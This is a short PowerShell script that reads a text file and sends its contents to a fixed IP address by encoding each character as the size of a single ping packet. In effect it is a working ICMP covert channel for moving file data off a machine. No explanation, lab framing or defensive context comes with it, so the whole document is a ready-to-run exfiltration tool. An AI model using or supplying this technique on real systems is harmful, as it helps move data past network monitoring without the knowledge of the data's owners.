# Define the path to your text file and the destination IP address
$textFilePath = "message.txt"
$destinationIP = "10.0.10.150" # Change this to your destination IP

# Read the text file character by character
$textContent = Get-Content $textFilePath -Raw
$characters = $textContent.ToCharArray()

foreach ($char in $characters) {
    # Convert the character to its ASCII value
    $asciiValue = [int]$char
    # Calculate the corresponding packet size (ASCII 0-127 maps to sizes 128-255)
    $packetSize = $asciiValue + 128

    # Construct and execute the ping command with the specified packet size
    $pingCommand = "ping $destinationIP -n 1 -w 1 -l $packetSize"
    Write-Output "Sending `$char` with packet size $packetSize"
    Invoke-Expression $pingCommand

    # Optional: a short pause to avoid rate limiting or network spamming
    Start-Sleep -Milliseconds 1
}

Write-Output "Finished sending messages."
